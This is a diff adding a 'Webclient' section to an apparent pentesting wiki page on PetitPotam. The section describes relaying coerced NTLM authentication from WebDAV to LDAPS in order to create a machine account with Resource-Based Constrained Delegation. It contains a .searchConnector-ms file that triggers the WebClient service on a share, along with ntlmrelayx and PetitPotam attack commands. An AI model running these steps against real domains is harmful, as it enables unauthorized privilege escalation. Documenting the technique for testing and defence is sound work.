@@ -32,9 +32,43 @@ Petitpotam.py $ATTACKER_IP $TARGET_IP
 ```
 {% endhint %}
 
+###  Webclient
+
+The goal of the attack is to relay an http connection to a ldap service. A summary of cross-protocols NTLMv2 relay attacks is available on [Relay documentation](../ntlm/relay.md#theory).
+
+On specific conditions, the coerced NTLM authentication could be used to impersonate a machine account and execute a [Resource-Based Constrained Delegation](../kerberos/delegations/rbcd.md). The conditions are:
+- The Webclient service should be started, it could be checked with [WebclientServiceScanner](https://github.com/Hackndo/WebclientServiceScanner/). The service could be triggered through a `.searchConnector-ms` file dropped on a share folder. If a user browse the directory the webclient service will start automatically.
+
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<searchConnectorDescription xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">
+    <description>Microsoft Outlook</description>
+    <isSearchOnlyItem>false</isSearchOnlyItem>
+    <includeInStartMenuScope>true</includeInStartMenuScope>
+    <templateInfo>
+        <folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType>
+    </templateInfo>
+    <simpleLocation>
+        <url>https://whatever/</url>
+    </simpleLocation>
+</searchConnectorDescription>
+```
+
+- To retrieve an authenticated connection the attacker should be considered in the intranet zone. One way to do it, is to use the Netbios name of the attacker machine.
+- LDAP signing/channel-binding must be disabled (this is the default).
+- Valid credentials or an existing connection to the target machine (e.g., a previous coerce authentication with PetitPotam)
+
+1. Start ntlmrelay: `ntlmrelayx.py -t ldaps://pentest.lab --delegate-access`
+2. Coerce the authentication: `python Petitpotam.py -u "login" -p "password" -d "pentest.lab" <netbios name of attacker machine>@80/whatever.txt <target machine>`
+3. Once the webdav connection has been relayed a new computer account will be created with the delegation rights configured.
+
 ## Resources
 
 {% embed url="https://www.exploit-db.com/exploits/47115" %}
 
 {% embed url="https://github.com/topotam/PetitPotam" %}
+
+{% embed url="https://pentestlab.blog/2021/10/20/lateral-movement-webclient/" %}
+
+{% embed url="https://gist.github.com/gladiatx0r/1ffe59031d42c08603a3bde0ff678feb" %}
 
